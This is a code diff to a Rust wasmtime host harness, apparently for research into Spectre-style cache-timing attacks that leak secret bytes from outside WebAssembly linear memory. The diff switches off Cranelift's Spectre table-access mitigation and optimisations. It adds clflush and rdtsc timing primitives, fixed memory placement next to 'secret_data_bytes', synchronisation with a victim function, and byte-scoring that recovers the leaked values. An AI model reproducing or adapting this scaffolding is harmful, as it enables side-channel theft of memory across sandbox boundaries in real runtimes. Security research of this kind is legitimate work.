@@ -6,6 +6,8 @@ use std::arch::x86_64::_mm_clflush;
 use std::arch::x86_64::_mm_lfence;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_mfence;
+#[cfg(all(target_arch = "x86_64"))]
+use std::arch::x86_64::_rdtsc as builtin_rdtsc;
 use std::io::Write;
 use wasmtime::*;
 use wasmtime_wasi::sync::WasiCtxBuilder;
@@ -18,6 +20,8 @@ use std::ffi::c_void;
 const STRIDE: usize = 256;
 // Make this seteable to infer the BEST PAD size
 const PAD: usize = 160;
+static mut COUNT: usize = 1;
+const STEP: usize = 512;
 
 const data_size: usize = 11;
 
@@ -29,13 +33,13 @@ static mut public_data: [u8; PAD] = [2; PAD/*pad here*/];
 static mut tmp: u8 = 0;
 
 pub static mut exfiltrated: Vec<u8> = vec![];
-
+pub static mut scores: [u64; 256] = [0; 256];
 
 static mut NEWMEMCOUNT: u32 = 0;
 const SCALE: usize = 1;
-static mut STATIC_ADDRESS_START: *mut c_void = 0x3000_0000 as *mut c_void;
-static mut STATIC_ADDRESS: *mut c_void = 0x3000_0000 as *mut c_void;
-static mut STATIC_ADDRESS2: *mut c_void = 0x1000_0000 as *mut c_void;
+static mut STATIC_ADDRESS_START: *mut c_void = 0x1000_0000 as *mut c_void;
+static mut STATIC_ADDRESS: *mut c_void = 0x1000_0000 as *mut c_void;
+static mut STATIC_ADDRESS2: *mut c_void = 0x3000_0000 as *mut c_void;
 static mut ACCESS_INDEX: u64 = 0;
 
 lazy_static::lazy_static! {
@@ -104,14 +108,15 @@ unsafe impl wasmtime::MemoryCreator for MemoryAllocator {
         // * WASM_PAGE_SIZE
         // To shrink the allocated memory for the binary just set the number below to 0.5 for example
         // TODO make this and option
-        let PSIZE: f32 = 1.0;
+        let PSIZE: f32 = 0.03125;
         let total_bytes = match maximum {
             Some(max) => (max as f32 *PSIZE) as usize,
             None => (minimum as f32*PSIZE) as usize,
         };
+
         eprintln!("total_bytes {:?}", total_bytes);
 
-        unsafe { eprintln!("mem at {:?}({})", STATIC_ADDRESS, total_bytes) };
+        unsafe { eprintln!("-> linear mem at {:?}({})", STATIC_ADDRESS, total_bytes) };
         
         let mem = unsafe {
             let r = rustix::mm::mmap_anonymous(
@@ -120,12 +125,16 @@ unsafe impl wasmtime::MemoryCreator for MemoryAllocator {
                 rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
                 rustix::mm::MapFlags::PRIVATE, // | rustix::mm::MapFlags::FIXED,
             ).expect("Memory could not be allocated");
-            STATIC_ADDRESS = STATIC_ADDRESS.add(total_bytes + PAD);
+            // The new memory is a multiple of the page size
+            STATIC_ADDRESS = STATIC_ADDRESS.add(total_bytes + COUNT*STEP);
+            COUNT += 1;
             r
         };
 
         let linearmem = OwnMemory::new(mem as *mut u8, total_bytes);
 
+        unsafe { eprintln!("-> linear mem at {:?}({})", STATIC_ADDRESS, total_bytes) };
+        
         
         Ok(Box::new(linearmem))
     }
@@ -262,7 +271,7 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
                 let memory_data = memory.data(&mut caller);
                 let addr = &memory_data[param as usize] as *const u8;
 
-                //                println!("Flush {:?}", addr);
+                // println!("Flush {:?}", addr);
                 // flush the real address of the memory index
                 unsafe {
                     asm! {
@@ -292,14 +301,43 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
         .unwrap();
 
     let pair = Arc::clone(&ping_lock);
-    let pair2 = Arc::clone(&ping_lock);
-    let pair3 = Arc::clone(&ping_lock);
 
+    let linker = linker
+        .func_wrap("env", "finish",  move |_caller: wasmtime::Caller<'_, _>| unsafe {
+            // Waiting for the lock here
+            
+            // Block here until victim code function is called
+            unsafe {
+                ACCESS_INDEX = 10000
+            };
+
+            let (lock, cvar) = &*pair;
+            let mut free = lock.lock().unwrap();
+            *free = true;
+            // We notify the condvar that the value has changed.
+            cvar.notify_one();
+        })
+        .unwrap();
+
+
+    let pair2 = Arc::clone(&ping_lock);
+    let linker = linker
+        .func_wrap("env", "pong",  move |_caller: wasmtime::Caller<'_, _>| unsafe {
+            // Setting the lock
+            /*let (lock, cvar) = &*pair2;
+            let mut started = lock.lock().unwrap();
+            *started = false;*/
+            // We notify the condvar that the value has changed.
+            //cvar.notify_one();
+        })
+        .unwrap();
+
+    let pair3 = Arc::clone(&ping_lock);
     let linker = linker
         .func_wrap("env", "ping",  move |_caller: wasmtime::Caller<'_, _>| unsafe {
             // Waiting for the lock here
             
-            let (lock, cvar) = &*pair;
+            let (lock, cvar) = &*pair3;
             let mut free = lock.lock().unwrap();
 
             //eprintln!("Waiting for lock");
@@ -314,17 +352,6 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
         })
         .unwrap();
 
-
-        let linker = linker
-        .func_wrap("env", "pong",  move |_caller: wasmtime::Caller<'_, _>| unsafe {
-            // Setting the lock
-            let (lock, cvar) = &*pair3;
-            let mut started = lock.lock().unwrap();
-            *started = false;
-            // We notify the condvar that the value has changed.
-            cvar.notify_one();
-        })
-        .unwrap();
 
     let linker = linker
         .func_wrap(
@@ -344,6 +371,7 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
     
     //let secret_data_bytes = STATIC_ADDRESS_START;
 
+    let pair4 = Arc::clone(&ping_lock);
     let mut secret_data_bytes = unsafe { core::slice::from_raw_parts_mut(STATIC_ADDRESS_START as *mut u8, 11) };
     let linker = linker
         .func_wrap(
@@ -363,11 +391,14 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
 
                 //eprintln!("Unlocking");
                 // Unlocking the mutex
-                let (lock, cvar) = &*pair2;
+                let (lock, cvar) = &*pair4;
                 let mut started = lock.lock().unwrap();
                 *started = true;
                 // We notify the condvar that the value has changed.
                 cvar.notify_one();
+
+                // Then, block again
+                *started = false;
 
                 //eprintln!("Unlock");
 
@@ -387,8 +418,34 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
             "save_byte",
             |_caller: wasmtime::Caller<'_, _>, param: i32| unsafe {
                 unsafe {
-                    exfiltrated.push(param as u8);
+                    scores[param as usize] += 1;
                 }
+                // Get the two bests
+                let mut max1: u64 = 0;
+                let mut max2: u64 = 0;
+                let mut max1_index: u64 = 0;
+                let mut max2_index: u64 = 0;
+
+
+                for i in 0..256 {
+                    if scores[i] > max1 {
+                        max2 = max1;
+                        max2_index = max1_index;
+                        max1 = scores[i];
+                        max1_index = i as u64;
+                    } else if scores[i] > max2 {
+                        max2 = scores[i];
+                        max2_index = i as u64;
+                    }
+                    // This is the victim code
+                    // victim_code(0);
+                }
+                println!("({}){} ({}){}", max1_index, max1, max2_index, max2);
+
+                /*
+                unsafe {
+                    exfiltrated.push(param as u8);
+                } */
             },
         )
         .unwrap();
@@ -416,7 +473,9 @@ pub fn execute_wasm(path: String) {
         unsafe { config.cranelift_flag_set("enable_table_access_spectre_mitigation", "no") };
     
     let allocator = MemoryAllocator;
-    //let mut config = config.with_host_memory(Arc::new(allocator));
+    let mut config = config.with_host_memory(Arc::new(allocator));
+    // Disable optimizaations
+    let config = config.cranelift_opt_level(wasmtime::OptLevel::None);
     
     // This actually produces the same default binary :|
     // let config = config.cranelift_opt_level(wasmtime::OptLevel::SpeedAndSize);
@@ -548,13 +607,6 @@ pub fn main() {
                 let inputcp = input.clone();
                 let path = String::from(inputcp.trim());
 
-                /*let job = std::thread::spawn(move || {
-                    for i in 0..times {
-                        println!("   {}", i);
-                        execute_wasm(path.clone());
-                    }
-                });
-                threads.push(job);*/
                 // Launch the thread to execute
                 for i in 0..times {
                     println!("   {}", i);
@@ -580,7 +632,7 @@ pub fn main() {
         }
     }
 
-    #[cfg(not(feature="interactive"))]{
+    #[cfg(feature="parallel")]{
         println!("Non interactive mode. Executing each passed binary in parallel.");
         
         // Execute each binary passed in parallel
@@ -598,5 +650,18 @@ pub fn main() {
         for t in threads {
             t.join().unwrap();
         }
+    }
+
+    #[cfg(feature="sequential")]{
+        println!("Sequential execution");
+
+        
+        for i in 1..args.len() {
+            let path = args[i].clone();
+            println!("Executing {}", path);
+            // If the path endswith cwasm...load precompiled
+            execute_wasm(path.clone());
+        }
+
     }
 }
